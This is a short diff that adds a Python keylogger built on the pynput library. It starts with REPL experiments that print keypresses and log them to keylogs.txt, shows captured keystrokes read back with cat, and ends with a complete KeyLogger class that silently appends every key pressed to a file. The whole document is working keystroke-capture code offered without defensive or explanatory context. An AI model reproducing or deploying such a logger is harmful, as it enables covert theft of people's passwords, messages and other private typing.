@@ -1,0 +1,54 @@
+pip install pynput 
+>>> from pynput import keyboard
+>>> def on_press(key):
+...     print(key)
+
+>>> listener = keyboard.Listener(on_press=on_press)
+>>> listener.start()
+>>> h'h'
+v'v'
+Key.ctrl
+'v'
+Key.cmd
+Key.ctrl
+Key.shift
+>>> from pynput import keyboard
+>>> def on_press(key):
+...     with open('keylogs.txt', 'a') as logs:
+...             logs.write(str(key))
+... 
+>>> listener = keyboard.Listener(on_press=on_press)
+>>> listener.start()
+>>> hellodam testing
+❯ cat keylogs.txt
+Key.cmd'h''e''l''l''o''d''a''m'Key.space't''e''s''t''i''n''g'Key.cmdKey.cmdKey.ctrlKey.alt't''c''a''t'Key.space'k''e''y'Key.tabKey.enter%
+from pynput import keyboard
+
+
+class KeyLogger():
+    def __init__(self, filename: str = "keylogs.txt") -> None:
+        self.filename = filename
+
+    @staticmethod
+    def get_char(key):
+        try:
+            return key.char
+        except AttributeError:
+            return str(key)
+
+    def on_press(self, key):
+        print(key)
+        with open(self.filename, 'a') as logs:
+            logs.write(self.get_char(key))
+
+    def main(self):
+        listener = keyboard.Listener(
+            on_press=self.on_press,
+        )
+        listener.start()
+
+
+if __name__ == '__main__':
+    logger = KeyLogger()
+    logger.main()
+    input()
